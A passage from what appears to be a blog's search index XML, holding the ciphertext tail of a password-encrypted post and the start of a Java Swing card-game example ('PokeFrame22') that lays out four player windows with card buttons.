f45c93c2b78a411b91b8274a89007c92dc0e2b0a4a3c0a17f2dc96ec2789bcc658fc48b08b09a10f1b0aa0a2476c32e71d70fb635a43c5f452dcecd12f8b627a72e88e3ccf58981ad2cd69d2869f7cecc000c417b83251907b760710ef03a49e9e52e8479508c5377cbb85eb5bd2933c743a5c4b9eea52b7483e6ec7fda687d4098fab50e62d65f67e02a3bee364044f44f46c51ef3bd1df26ebc7a08616aae3b529a3e356ee66f8571ba0b83353c55b6d70a0c187f456209c5d535b0ca453808bfb788152a8da807b590f087d0abca4091577bcc7e5c39a13534e1bd2e028848ba686ad4f842c67fe2ce811d64a2044993845c7a47998eff0eb4a4afdf5312040b0261370296f788a623a31c789091a1eb9cd361489dbf193dbc6a295e391c6cb761884591c5f94f2c406d173604f4d26a1da42cf3404a4188f80d4ff632ac8b6dcaa2a6770c4e1d104cf5cc906bc01b056459182bf4d04c017e0200df075c9ae01ce44ff37195bdf748fa959b5f52d07f1b86b8199edd5aac93131089a1883b75c942a7565b38d4a4511b8c60fdb5d0a1c6361f9bf7717b0e9d091663d253c34eb92295bac2fc2d5cfcd90e8727578adcc8a93ad099bb0737614a46de404e3e2ba1cb75904d243c4983db4cede4ce820d6654e068e6da93433b047b07145dda3f229558b4bade84df9b82d07e50cefb76c7470d15adceaa0e959c58e66cdd0e9ce312115e87b08814e598a0867cc3fc03c4d7a9263f132db41bbeb6dc5075207508100998755ab96f0c374dabe81f975524055a254fb1d64901ad07e1bb97a731fe9ad045c60c4467eed03b949da3dfb0d5497b890e10e2a196bea4826e91d03c8bcac85d70e67caf6b0c45e30930d1623b27da203630f87d43c327360bc2388cfd4836b09773ff89c708a0b7a0b35f8808ee0ff98527cc3001a18d6cc7ece3f5a7f44599b2e3d5c9583de0b8f5816e97745cfe34756b9f8e90801e4e2a15b6d280ecc9c1ddbb283bebd9d4d0f450f7694637dbdaa78e9a098ff984dc21e88f6a8353bad16a007408beae339cd4cb04b57f00e4f60f876696b29434e53e9f3282ebbd9de702fb5c63cbb96982f2ab015e9f31b78fc73310bffc982e33ecc5d94d5d3a0f09866dfb3669f9e4ad4444673a1d80370088d98cc6b573881e5dc4ce3cfef0bbe926aadca62a859a7da4ddd4c19ec946852758bc83962d1ea50ca893829cd655363c777de3d2a5d33430687275f8575b0f27bda9844c96d6da313ff6ca779b07ad1fd9ade6129f0a217a4d6b32ad15471e7852259b285fc8eed5f51dd10297eeeb78f31e332e08a586ccf92e32b6dd515c94ddc2c2504b4d22372c8c71640b156659547cb4fe57a89eafc94a38df1d927788855ef9037fb751373310727b236bf20963c8ae03a59ae83c189fad41f321deed92de527ba38e1d6745697d147bb5478da5cdf4ef5c5dde76244699dc4c106c528514b9c22ab95ce4fe77e66caad67baa1f1b8c98a34997accdc49b6ca8c345121721400ce535cc9387f766ba7f58e66dbc11c4a6712d9f068b14c10a9ceab88f129f95429ff205788ae7526c2dfd7c519c8902427570fac4b8924ad69167eec385c9f2320022ae27485998aaa3420db684977bf76e841d197609f0deae36a74c1902e2e44473874113d17a27ad5f67bac6423f982cab06cfb2bd672eab87cb63a3b77e20fbf86e017467e735ff845ad9a9de3e0c0ce0626dc0f052c31eb3211e381f8339c7aee073f3e0739c69cd1917e5d2713f9fe92fb7c186eb28567ba203418c064d97c8987901e3a36f32b49c282af8f023bf02a7074147a5e01923e8e2b7b7a43bc828ce3056737556cc85fea73b6a756c1b05a35756f6ddcc1eaac2cfeeae157d9173909f77a2bd9b71eee1f5d44bd808405cf6ddb493e4bb103185a0177732ff10b872e728aef6c0a8a46879be833a0ca0952df8e96b2e73fb717b87ac9b0ea57169fc60678b251fa151cb63b680a357fe765ca8c81b6372c94ace54b8893103cf9c44094ce2e28fc66925c5e87a205fd9ab55522a748cf8b14a6a938cf34812eac1000b8e293e9ba8a536ff82bdf0efe0f5b95e10b9ba55d0d2a88657573cd408f9ad529564885d66a497ae4adc5fc7a683f4852812cf4c7b9be5a8130b2c3511791021d285157b84eef19fb7be1397c73a3b30e2a613b0055c340a5f2bc741d190cda1daab39673efe030b458309f813ec26449b7d4e52029101a2f9010c985ec8613678fc8b4b73e52084f740c3a4dbfa51238187b68ee7c7dddf74f94f3e93ba26ef72c1318d75be7dc67bc1d4958d2ae793c5d3ee80d9495bf66627c2417da76276ff877ebbd27681928c867e4e7476a894b13f4e07729441bd96428903bc97107ffa6db7141ff4abf66ffb75791874700b9da37195930f4b9d7410e645f6d8c766257f3a8e368586bf44f2b50c992a7ba035355097db2986c177bbbba079faa82c623536d10c2e95660142674524214fbc2bd5fb3beb5a7993b9ea832d9f7422e30f403a6637ae1f372bc4f0c2f82e5fc88dd64ba78a44e2d2552e3af6b8700a92c8ce3897dcb17e2d76aadb94ef665122d27ccb5911983cd0966fda9844ca1840989a57624c316f24a2b27c9c3dbe766de6368a8c905e0e8e4b177f187eedffe4e9caf25db0a290fb8e839c2ea7f801f2ed1c7f9cdf7a25210e67451766e977d8149d2957c2555e0bed3856fe3e3886be8998329fcd33218e92a8565e0005c55321f54cb491d0b779f92f1c3327f7a0dbf55cf6ea95dd3a2dd6c2d4ae83dc49653a3f443f583dca8048401fe5a4c82b202c9d7feb914899b5014034d972ac827cb42335175144da3b6ef84242b7040be0411beda4adde725c2181042a1cc4cb9020b5e3d0eda6653ea15174239feb302ddda09a546d9fde62952f0e0bd99266e2e7e0fbb248970890ead904104328107212b76d543ebc04799b579e9710634f25ebd3b3a2c1608daf1903477ed4e1b23a99c5ab339261d4c6545d535074393c3ca583907b456acc978c4a81311ceffb50b99720c4cc1e8ccfefbabc19bc7fd15ddd6529100bf96b1409b8a4688ffbf44e9414ef1b8a26b70d4cadecb6e3909d6c87c9adf195b4d94e767ca71712df132e05132daf2b7e0613424f4da1d2077f04c5207ad83306b6bca67110955528e0c96682588cb5b0c382f87b7655aba724d3d9cc0da0788fd1098dac4bbc54d39ff4aff799891da9da3f83023026b03a8800ade38225b816d1a4bd70ea8194a899ae3afef56dc4b4ff2207e4def429d0d509fea62f4c0da766f3c9c539f3279febd562b84073432a3ea61799be1af7f5d5ec6d1ce7ab6cc9024b652e3f1d72085cdcdb91413e3fadafd26e1e63bcbeb865e9dcef80a6023859f5959de3c2e7cddf37674ac04f41f81543096206b8bfec105ec946ed5691599d072fe65113daa5fedb2c716129afe7f99df55e2e8bb4694463294e2716d9de08b06397d9d16285b99df3344de287887fa15dcd8137ecb16c48e9ba0d21a02cb3505a8b75f5c3c0da471c5576056df0ea66b35cb5f924d21edb5e37b5352baed8c34e684459a9cb58f76e0ed6ed75a714600c68ff19f5efa48515902e4e534081ade62ab594f4761bf0d02c438e70ee5233bea36a58f44a60d862a9b33df86daade64a0e42fffdcb369708459b6ef621ec303427c9dcd9a3935be750cc16f2ece2ce28f15b78290c9ee9278fd559b9d3a78758bb5aba48561d9d9e86a66c0851c8f72a687e00bb93c622e38f0c335e3a214c73db344ed34a66583af45148073c88efa021146ff7ca19e7b0434c118a8c840ba2f76dd414430991f795aa4ac6a3f3c69ca15e39039b01dddaec6212a19bcecc49fc311072056728e9d56c326794e635f0e717208e7d3c3bcee356dd5394a987f4a7ef716b1825f28d5342cacb2cfa0436a84664dc7cd773fa86992c712963d0e241715e45ada874ffde2936be17df74a80680870cc45ea6d3ae8429bb9a013b0cbffb55d6646ea82507b8ccc9eda4c094600bd9b2a392ad33e55507b245fa05d2f0bbd7699c7242e057d5f6b2a357b25b0bbb62e4ea04e2adb287c8163620bdd083877356ed58e7877e5158f01d9ac9ece36425187cc27b66ef871680a4a7f1e2f4654e27e5d5a5ba464a2c2fc2e4d4d6624e677e56b1103b17a289e4797434875260384f7e4a87ee2736a34a76e9e195b885e5e03ef8334ce38602af80e93ea42763df6887ad844689623c9e752a62a6bfcc3714bed488a708c1b6bf025f367eec3fb117654e1cb22c390357e1dc627ccdcccc7b66ef03a61eed45476f0e52c344f95d6e356d39b755ab33a0a5d3704ecc01a150cead72619fe8f141d0952d869cc77e982d9053321808b3061718d90dbce4e8674f6a4aa83800cdbabd0912bd64c0b87df2f0742c0568d840b3dde3a0019b9bf4e3381db5f404a73607b98ce5742838e0dd74b9cf5915efa3ca4d17466b91aadc03e11216f4c9836efec95a3f7a718d305adb0c0753eec51aaec7877795374623c70688b75f997f169687fbc283aba9f9a7a0117afb512089bed18597dd635e89e9f7d69c244451dc52bb451ab624ef8f096206462cda94caea72f074ed313da1e5906c0edf5092fdec4d216b1f05a82124144aabae8fe60668d2a8ca2db225868365c06959b07ae3cd19442b37526fa1b62c84067ed811e51a8cd1e859bca206fc80ef2ff7229e5b8047b4d59e56e8c5d8501ec20919876bd89c74aab4df923bd4e2b804d3f145609c4aebcfcb4e97b383daa76dbaf3dc6ffe290d8007e4c9404675878d7afd236cead657081c18e9cb2cad3eea95351942e4d2ce8a4d2fed3b68a400a088d3906f8921227db637873b103202bd8b611a265a34e79aee86e0faa4d11d82883d2d77ef138bb72b561653034aeb4673305de2fb04e2e4eec9c2dd4df8fa686e64b5bb2e999c73ac081c007d878c29b79f03690878034dbd41e80cf9d25a3709b43dd0de869f89bb0362f5ecafbbab30becacbfe08ea354b50d26f56d408f132179ed54147e164776badba2359587fc0d5be8db1705cbf4b5d4ebcec1dbe3746d5da400784c9b0821471ae9ef170b5174fca562ff84aadacdd394d6d7504afd07a53a45f63674862e2aaa4b4ca859754c9938bbb672c13aee7825837f597514ea5ab8a986d06108feaf0b69957a8a183b98d826f274419573d3ee115324e66f710314cf559fe9d9a848fbd369ac27fb3df58a2729fca2851805bb0c904f4f0b8884cfb1aa5e28719626183f485258fdbb33596e160b1c084ecae153025124a2cb10d24f0955edd13424157db0cdf674254097476f6c06ff08621d9661bf0144d767f289c4f644ad419fa4e74fc3d270f4a73b0f68581b28f2d7171d9d4b7325763d071f0c6548d9995ffc670611f32319a25261ed66dbad77aaa2a285b9f2cd7359a9e41ee09b8136fdc4fa344748c24ffde36785fbc655fb3af7e619e74ee489db1aad3b358581effe431a21c81767a85451cde983d92f55def54e70f9cf21e5488dec1c41c4a4360ddd27ee6662cd50436ac5991008a90b5b71a5fe1459047a411a67ad44bfe1f3155fd840adecac7f4391782a41564f5785c31aca4c4ba3349ffafb818a42923d3da2dad7caec3fa656dc96948af41bbbd0787f41c38312fe55c2bc910f0cfb4100869937a1b7781be824e452bb298bf00e5b5e1703244255d2f0f385c0a3c60878b711251c045ddc1b0d78559ec613ff4d3aebb5e4a169996e40c0291fbda9b77d9193673baf5c36090ee10c61573bd1e843ec6a051ec85086725d219530dcbd82105d5b426bfd9479931e46dee99204639a683a78d680ea9df595141be0d37ac2e64952279a90fa0883dac5efcd75a1579cd5239e139a1ffbc3986a46f6a03bbea2d800883073b9632a4cd4b7e13631123da30e66916518e3d77ed2e130ab302d504aae393acb4fe7480d69574cb48ac7a3f8459b64262d17445fbb817a5a14c82a530d6a5085ca5f25c2729b5c91e9a268ea3c2d546428e4800b094127e8366d08e24015e4f3fd58ff82470af87cb0d4adc2863a8d3a812a7235b15e443ab0c520b22f7e275370fb6371a7cd4d2b59dafcf8ef5e2b53b81daebc511ef56395a7213f6f1efab7eb3bfecae0f60465a7837f8f417cbd495719bec3a57e180a423a5b0afa166b52b3f36a2916200e7708388e144419949596dbab963ff19f1e50baee3e72eb79c415194cf75dc52357b5e36264518d291f6e92f2ba3fa4fc4ec4e04d139324ac61500ebd481c811237ceb2eaaa040163122d60eb6549caee85150fc4c1060f3ed3e2e006f5cb52a8d0d8ab80948338826657976e6da84ed04574ab8c7eebb092078a6ea68048d4dd981f4b8774feebad4aa22aa702c06de1ebe7ffd31f2d485015138b1bccbac18eece4d549574aba983a716c1100219d37fee11b152837db357db8e3b837f250ac592ba279d708b864f85cd494f26b0c3c2d705c0dfc2ccd6cd6faac08374e719c20f6981ef5876cff351e7833438a3c3469403b879e101c9f35ccaa207006489ccd9d3b4d6c4b3edde4a0a73216eed13fe22bcc313b0a30ad3b0b188d3d6c18260dfde52f300907a1bbc2cc3914295794cfe59127ea3d3cf773e7e172cc581eb182a11c812da9a7daa5b2c1eabd12fbde0e45f94e1ea9bb2091f66bb9dcf4728b8332c2e617f07949f87e23c386ac5bcae2e36ef0bf5fb506a66e4e46eedf558824fec79af1feff3ef89c287136c505f4f7334da00502d260e22df14f29727118f84cb44e6950a098808e5bfe6912b29c10acb76e99b4cf614166e57a14eaa57a6c74de7ff4008cfd8bf55bb5bff5d8d9ed150fe5d09f7406f6fd5f0c3a3c082174ff5fc29f9de6353dd88a26feef3d1e9cc8fffe9c61d0a353e52f5f4d0791411def389366494094aebba7ee7ca17bc3d1171fc62c10fbb2f8035baab6e594db235a14dd5382088a584b0e4cc7fb5d7ce774b921c077d3bcb97dc1976141eb88c030e1a253c51d93dbd061cda291774ee8119ca1f02cf14c2d09b5367dd80f10f90f4844862417297fbb87d3d50ee919a7d10d2c5ea99a8aa4150f266501a8f5e9a5e76c54600a6fb5236c893d35a13d78f71a0092d459faa40384f3f55f98594b26078fc66994b0667ba242da2f7a4e745893b10c2956f70c320e8467bd568e137a64ebbbe45670df681bb54f7dce85b16cfb2f1613e31a9dda690cb97e7889ae04885cfcb4206dbbbc59fdfb5b398c234f3be90e89736abd4f5083323d53fdda4c9d916778c30ec44ddce45ec3788efe8e91c43333e844b6877460dcdc113333ed277ff3225be587a53b0b49f9634fe66df36aee7f4505175a7a8fcb554c29b3506f7800809a69d4472e92b9debc7b75668fa239b93c9251bdac6d80f2ea91ea960255570dfb838de4d3795c6c4142d8d9992ce52776ee22b2b363e388bf3e2450ca66477a454280df04eb82c5b114898c64152edfb8a1ff70ef39b4562d5467bf97af19d24467a9a3f9d0ad4f3c883061462941b8b68d96b32c3c3e652dacf480e6fc059d0713a3ee8638cfc8b4170d904ed86a9880bb0ef0b1e5ec54f18bc83b183b5f5cc51ccd93cb99a8c383605e10058378bbaa3231d0fc13e9b176dc8e91a301e1225e1599ade5de2c42128e054c5f88ae5c1d6054b63186631318d78b9296dc2a22efdeb99db5c4863e832e257415e8cba41464cb71d7b0253389157ed88054ebeab0834ab2358e593751f6fe5f1970696bfb8068f86d06b186bd54c63a55aa5cfcdce8b268ffbf970dcd59823684ce61cfd77199549bec7c3eb0c2b59ac7781e40912667699686c30cf7ccef5193685a49612da2c613fd051dad311c9830eb1e29d3f75e74c361d87a093a4a031128e80ef4479d2d9cc223909dc75c3ec815267a80ca6e3a337f8cbc7eb51928bd81979140669303e431cfb9d67af81f7e3d9b378a34be763f70844f2e7a137ba4592f73600e99dd8598c8632fa0025e07864b2926df31de82096fef8ef8dfa8576adcbc155a813e2e2e2c2b7f4bb5582482aac3321375972c45c75d6c23cb1e7dd3fba3ae88802aa0abc1eb962dafc2f305a14188f74ca931efeb6a9a5132c830fd9d2bad7b9f566583b5a7263d728c8788246b5123c6819ba84950245852ec7099e3352987b6b62c2a9fc28efc9f19f57608ddce4559a9968078d1211e5e2cf57e53661078fae245db5d67032ac6d5fcac4fc6e0f3cc3d5e1627ab6b9ddbf44c0bd36c8f285fb4da212dc674d92b48dcc1e5ce5cc34c9df81085f60fb54327c38c8fb7d269dc8a494b1dc5efc7315358e438bcf23acfb27da6e9cd4571be5eef5d8ae0583e7c81fc5173eb7f338c9899b663a975a02e9aee2d2c81adfcdb88f4ff4c85222ec463afa8185878d4349e7ab20748122ac4e68d4ad1cf004bc98fad70f1c8b3616b7ad3a115c036720daf567cdaea254b8bdbba93c1b4c01bea99b02f8f6f895a7998aa7be1387fb045296bcd2871c79961113a4cdf38a727dbf8297ccabfa6579088d2c9f24a8f19de337cf1cd1464c1154eadb8c79fedca5fd7a6575d09936a86b3ada23b49bd254118a38541b1ac593921b3dd104ec07cb4cd675da5840de32500983ce11f0baaddd8f05eb020242f8d26e5a1f328a9a1790e3301825d1138f10246c9236847a830a98813d84334c14ddec14536ba6eb76631a520ddad9da87aee7819744b344118b78220a5326899c20793e830702149c7ae8aa8f196cc1be9bb0ca10efcfff1dad372f7bb4a07b134e482870e643ec68b1a78e1a10597a7fa2fa94fc6a5fdf37ea213ce27d3827ab400e82fda5cf0e00dde0a90f27813d9846fba0dbcb1fdc7adb1169891f226ebb9d9a7f56fd7318e0b2aae01f87a0dc02aab8dde686ab842a603a3b2ef91165c1729876d620b772de6b0a549d48645e64013a68b67c128f86e9e1c495984b17d118481df37291c67af17636514c8c0f532cdb56566df7d1cfc265c86664c74c77f2a3958c0dcac1db3ff3a4abaaffca5cd5ea75cd4b3757302c5989f3e51f24225f41a7ac5645075d24bedce19a651b8aa429e9efc4ef9fcbe51561eae6aa3669ddd2567e31b2ec7269b65ac2ae124a794cca016e91cab03ceae3069b5d266c3498dad6105d3bc08f5c0456c4a75636d99988302d0cba32e58d912897700b0984345975dd6940de07fadac054bd9e1ed19b2b774938cbd0c8accdbf7c4d16cdc8614e704c01129ed654f90c6c8c741f6163d30041146e091edda2d64deea7ee839f2ce56499b452b3653d64be5272278c4428decd5749f06037293821826731bd29ecb60f3f0329bfcf5c82aa5b81950a9b038df2b5066299426fddd737739bfc526abdc7ffb90b8c2532031b5d74d44fe1c8345a6ef876b220ff7cd4afb75ce1ad9f42dbf52bfe06b5537eb1428f579c22f6e5a887d2621626d3a38e55dcb2e1bc36c5196b8bc5c582bddf2f2f3b540ac44783790be0ee48d0ed37bed269b60a117966948a4b151fc62bb2fdda2ec1f6fb5af42609e2a87e0b7510a094009a08737ef5a802b4898762385f01141d004756fc51120009b85a8b1c5f3a55615dcf8714bcb49e289b1088454301f621bee00823812d7ccca87fce6002470d5b394b9f66736ff264c9b8dfbcbb23acfa17593c1e2b3ae0550a5a032b82dd79b868a1843108208b56957f1030c99ea88ef90ec4f99676dde9bec40c30e5fb49442101fdbe8a7f4a5531376de63be565acb39f416368543825cfb29e71c2e1de30aa6206c6e533231f271598432b29a9edf9e2b2e8f3c737ab96038b2453c7b517e1e83522a8fb0d2a0afe874802678334c9b8fcdb264499947f9f1ee1b1b3b79200ec549a93b19c13124a1d80c85fc339054de86555f66ee48775e08c0c806cf7d8557bc12894b9565d24a069db317bd4600d93c9d4194f85610265385f7dde6f5af5d5500457d733fb3b55d00437d077016ee0db9342b840d518b58f7502dfa1a8a3a23ee1234d7db925c99c9e35a560200f3179d4636e7062fbfcd025d543361cedaab97da9e8e33ff514769c2b128bd0fdefb5b10c6fef516ec16cb031da685c2e3d94bf426d9956e4540a14234dcec5ee2e57e09c8f02f10d5bb245cf42392d1bf8f7ee588141ddd5acccf1f361916b75f726a96e87670fc0ea1a25b5075632d38d9f70f3039a1e497c0ca398caca8f39bb0f6f207f992cba39fc4f08548824369db1d3eac7efb153069119b5dc62355aa766019341350e72d555ac645a4b38117f3a66d0c83b5ddd0a2e0f775d02b20adcb4f305ea427d8f588f14909782b9c1ff97ff853f414e219a1184443a99425e69414d135cffc552de568ca69aa80fa4fae953e2046456b30cbd1c991496c1488be3cfefc03386f5f35748d69dfa1a79e0f71134291b1a529582d7857d3bfb0d514da25d3479ebccac2475083830b93b73e452f03484a4dcf8e37c5a0b1cb0d14c6095167f70c8dfdf6fe0123093d91aa9bd4112b83d5cc0c61fbfbb73ce47e06ab7ef81b208f94ab386c2d474502ca6fa6a45200263b8abeabd91516f15070fe93d31de5f0458447bfb70824ff844bce63bdb27da0f4fc7eb96502d7185729750e0c6a44b427e95c0eb741f266f935c03a8da171b7b5e6e80ef0f48c04226caf725b74280d277b60ede37f4602ddd2a0e6f34076004e70992765ce312bb0b5c9f4b26a56c10a91c8c298d63e3c210419e3a49271f8891aa2a10afcb2ec82a5ce84186ea9dbacec380ead7843d44853a64f9e8fe1df94a32b31296662c1d8b3d6ce3a3734a2b45a18603eb4619c5bf744327e17609aab41ce644406bf1e3be134e5f6efb875b4fc77260226ab173e7d7742358b0fc29c8653d4d099a127e8f99344ab2b63bd32ab4afd37e0e5056a449248b7270abd8787ac2b03910c7768933d207ace64fd6c71498fc29549de0ef42cb0f567053ed6eb1d2a4fbc7c5eb2e299b5fb8a0a7c650ec7abe9fd3a8c178f5af6c7ec33972c35d658a5e75993a5537e9020b51e08093b68bfbe6bd8becad8d392d094f280f8b12338e87ed1ac8722bd297c9994b1d7156ef266c7a1b70275513b3775e5a025cd2511b516f409091027826f03d03fdf8c34b3d3650403d1517414a2c3c2546f204dcc47e7225e909dd2a80fec4f05d813ef0dd0495d7010434ce2faf93eeb7f7a0571a5bbdf99dd5ff3c529e872707ac41d39990b0c04abace13b7194415895ed2f85110c1c1738c285c2bb48145d0d9c305e4d7639a0c23ecbee61c70c4c17b16e81642404fda60db4d6d1c414e8c68846bb8067e0b7337a804c1b1a177b52f91dc60ca2824fc09e0c898a21890647b0131e0bb9df543d19dc4b2ee78767d25e5bfc96c5c3b1694fd37b9d5452b4a62b0026040383d01db3bcfe99e6eefa8e39b3e7e7b61b2b886211eb89f78fa9cd2103a2dc7b327e7d8b6dff0d16c2a435afda774dffdb745a742c7e4946f7de411704590d8e36bc785b44b8a252b43177920ca60657da712a5bb9ed4689ae3c61f93965157cd03a6d6e2a377733f9eafa7a704031c8877ca2e2a63628ed11b1178c67c32bd14b111783e48496d286ebffd7254e3a0e348a7ecbf8b83fb7382b08aad590206effa65bb240934e83e50fefd20006e51633bcc558bdd71172631bd94fd2aef9a16a82b6c6f69fdc54a62dfed351428aa0755483f806448dc92076a6e70f2f03808e5f14939b3143f898381073b1883885127c9c78cfb3646b6e8b2f3fa86c8ff8e1e970927c9b1ad46a95217249e9f54b826bdce2a389a1f23be7fb35c0e87270a9bc4335e27fbbcfbce5f7d50a9ba27c1d34f0608dd328c1c72018abf435bfe8f293e209191fec2d8b3167e8568a6110b5f07e81013bf34439680ef9f60eedbd8ea17914a0c410075242bb5b2476314fc86b9cc6a0557d91b01a13adec45de6c27527359ba4d7616e21dd2ee057f67f37dfab84ae39722e84b47c0c848adc27d83379e86f4725c90d00c77a8795b558cda8515a921010c3488d49abaf82da9d428f92a7fe43d7980af289bf7cfa66a1b303f4fcb60077b1efd32ac5268ba1c39f790ff801dea1bd4d4f419eb8c8f57bce295b21531aa377dacb689f405c7d720aa4b92fc929dbdc14f881a281367e4e39072b75099c060ab46815dc1c0603c903da688d57d53d075ae1554e33fc1bf29b8aa25331004b13f8dfde94d36b83530ae36420c31e7b05a5e07f3e073d9782cf7b257aa21429cb5ded0f0d5cbc536ba3660c759699b4bc6c355fa69f0e0f0eb2f4a46d3c8c357bee25ad5bb0c6c9f3da9429a336118a65a195f168dc0fefe5aeed942c153383c630ffa684041ec4b775e3aa93723f57ffbaf717436b01b2cd62ac8d923999ce2443083f8c342410e934b3c4ed6f6fb7b159fcf52a6c0f7e7b4734afb25cc7ff36539c6478569eef91d4bfaaf435943c5fd52224e92d589a2f8f9c723580b07869338f30cc209ee2f84e482863c6a51e3307b55b7d285b4b08f9845e2afe9c9a2d10efc9506fed64aba8d90d109ae505986a37d16fcdf150e552080c9a33e1be111f4827a7fd64b7f60c63c3a7b345fff5f47994efa461678b4ddb720e07daedd7ea1f726fad2f31bd01ac33689447d94ffabe3c8b0b8062f2982bc46b32b0528445462c97ee81d4ecc895edd69df1ced5687d1dc798076639df30cd0b40de3533dfa649cfd6354f2865e7f67153b63168da743efaf8b5fe2eda22f324d279cff10b2b9cdf2e0b8cd46568f1bfbe172da6fef028a437416d6b9ddec6e8f99ac5153d39cee7d9bafaf1580a3cb8399bfd056b255f5a8152c56aa41c105e65ef4a0b3daea9ebda4e2f839df4d4c04c47ca90f5ed7b607a794eb53b87ae4ad604dca93c02137218066ae5b531cc27ef3231aae2b4d4e6890343350e80069eca3d5219635a269a26a50a30569a1450f3aa3dd7261e0b70ed45595282f26ab5ac33de57ff6ecec53356eb4a87919f3c33600e2494c32826a4ccfeeccc963ba0486ae88a0957a7d81e091bab3daac4645cdf4d43c392ade02613add7000498fbe2f6944c9f3702c167d28d44cf54f498ab9cd64fdc78bf57b4a25e0e80475b972dee03f2c920e660760581b6053b2cefe97d4abc5cd46f457c737977e56c8da8adc2e639e7693bb5887599a7dc64ced5d2f185e35218dd125c56ca8ab3af8868aa4eaca548b9bbadff73a7312286401959d09c2075319aedbb80c147f83316b4f18dbf7d8938601a8712027692b8a497a21bd847c02a52a656118206f1cb0d4369ea82cfc553fba382a9c1fee5cb60838fdd90a701c740cad3b193bc882db771b3f2bb78e0e14e166c10d11a00a328fe8a1966470c99c310d78955f74071a9ba223ced4d1b277b19da8a85b93c4a8a39f070f869ce274df0568a38381ddd14840554e6818a997e5f72f28ad317e10cc11c8f47b4e1513472ef30dc3f092824c3e11888e5ef452bf410f9a33f896ea86999bf683af3920923ee5c93b216b39b0e81ab021a1db6acfaf8be335e6ecab06c3c7ce14bec544394eff7bbe611e11b51910178b39c9bc57e9c0130b0f52faf8373ea4118322bfc1ee19d52f7132a929118dc6a1bd76f4220fafa0dc1760063c49cddc7ba75b45246794b9ba5ac7b6778f57d4e25f476c2bb1669d3c3fd9dcb5752311b9b1f4c8d25ca65395bf651b449abe13eaaa58998cfa4dbe87c91208da7b8fb0bb9e5c3b33b0ec8dc77e9ae617e5b1057669c5bd9a1f5ae374a4f9199b7485f6cc3e84ebf33d19e030fdc44cd1797cdd2f9a0e7a490627ec409e7d4a3ea52ce222e2fa87bd4fcab9579f59e739c924312f8981b66d2b73abcfc4af5e575b8686ac9bae057041f0077cb2d6b0c518f0c5e4cf9ba9d7d17c2147346bbf7fca77a7a5284125bb6fe0632985a6dc722d99b3f9ca62484b38f8ad99bcae8f8a5ab7e6a69242165eb301573ee693e5f3f5e175084e244664b65d787f628b743cd5b6d5bd7407e9533e35376287c03dd2fd39e6cd5952aaf9c9360e95d758fb1b3a0a7a2c73fd1a7a0e236f77715a89ced2cea31394cac116b4c209f82e3513bb03263278a41eee01de7583e6ea9bc2b19e3618be96a9321eb90c04eb669650734db731357598010bee46030ab05abe4627e492f109b759e07101417194743789d5e90192b2ebc757a3a667c0f006218893199f163071613349e3be917e5667ecc8d833cb0d20967099ff1ba7a4639f21748812fd000b006af005b317875656ca8edf2b25ea12a56e79ed7f43a1dcb13f6115f33629a27d29f3923dd34af5dde03884de52b3130f5e41e64f5884d78b7d2b7663fbfdb888573036ca183a32c7101f52302e657a698115297838a685c9a811aeca55e71de0cbe1fe4a2f20f67eee5a37ef2bf56bed4415fc4aea47dcd72c485a705907a48415d00b0f21ea7288a59d95e0dfd842183db7fc0cf25400b5593e9dda48c422da76c842921c0fd1843f9983e7b9348f68fba99bc9bc2d23a272046b0afb3e347a4f054c905585645bce024e261eb7e5407ff7c4d8e9681561fa42623a873ef50084117257494b968de45c7efa42e87cb851a85b46271f04829bfb45d701f0b64025860057dd3c1945cb24512d13b7019780b1cf9d05be0eee0615cc9fa7f7be9f5e5e65156679e60408ca6e3d3b7aee6dcfa5e2a1da126f1db1600824f6e6c604b374daeebbef8c5265f752b51db881b46f996930afe554cad06796010daf6d2b78340f4e26d13f0cc65a1ff3b667a858499f4e418fc125d309a37e4e5762a64f418d74ec3798d2d22656005c02e7750baba2d8254cd3bbac2714022fdb3d708ae513f247a850e9c335bc052732aec1024909fc76a2ca32a8bfa4cb1997338629e7f6af0263c5865911487811b42be22</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>Java PokeFrame22</title>
    <url>/2020/12/06/Java-PokeFrame22/</url>
    <content><![CDATA[<p>Java PokeFrame22</p>
<a id="more"></a>
<pre class="line-numbers language-none"><code class="language-none">MY:
package pukepai;

import javax.swing.*;
import java.awt.*;

public class test
&#123;
    public static void main(String[] args)
    &#123;
        dapai da &#x3D; new dapai();
        &#x2F;&#x2F;抽取程序
        JFrame jf &#x3D; new JFrame(&quot;LHL&#39;s Java&quot;);
        jf.setLayout(new GridLayout(2, 2));
        &#x2F;&#x2F;外窗口
        JInternalFrame jif[] &#x3D; new JInternalFrame[4];
        for(int i&#x3D;0;i&lt;&#x3D;3;i++)
        &#123;
            jif[i]&#x3D;new createChuangkou(i+1);
            jif[i].setVisible(true);
            jf.add(jif[i]);
        &#125;

        jf.setExtendedState(JFrame.MAXIMIZED_BOTH);
        jf.setVisible(true);
        jf.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    &#125;
&#125;

class createChuangkou extends JInternalFrame
&#123;
    JLayeredPane jp;
    int n &#x3D; 0;
    dapai da &#x3D; new dapai();
    Toolkit tk &#x3D; Toolkit.getDefaultToolkit();
    &#x2F;&#x2F;工具包
    int w &#x3D; (tk.getScreenSize().width)&#x2F;2;
    int h &#x3D; (tk.getScreenSize().height)&#x2F;2;

    public createChuangkou(int n)
    &#123;
        super(&quot;玩家&quot; + n);
        this.n &#x3D; n;
        this.setLayout(null);
        jp &#x3D; this.getLayeredPane();
        Setbg();
        Setbutton(n);
    &#125;

    void Setbg()
    &#123;
        ImageIcon bj &#x3D; new ImageIcon(&quot;img&#x2F;bj.jpg&quot;);
        JLabel jl &#x3D; new JLabel(bj);
        jl.setSize(w, h);
        jp.add(jl, new Integer(-100));
    &#125;

    void Setbutton(int k)
    &#123;

        String[] WpukePhoto &#x3D; new String[13];
        WpukePhoto &#x3D; da.zuhe();
        JButton[] ButtonPhoto &#x3D; new JButton[13];
        ImageIcon PukePhoto &#x3D; new ImageIcon(&quot;img&#x2F;fang1.jpg&quot;);
        int pw &#x3D; PukePhoto.getIconWidth();
        int ph &#x3D; PukePhoto.getIconHeight();
        int x1 &#x3D; 70; &#x2F;&#x2F; 表示2个扑克牌按钮叠加在一起的宽度
        int y1 &#x3D; 150; &#x2F;&#x2F; 表示扑克牌按钮底边距离neibuchuangti底边的位置
        int kuan &#x3D; pw - x1;
        int firstPositionx &#x3D; (w - kuan * 13) &#x2F; 2-35;
        int firstPositiony &#x3D; (h - ph - y1);
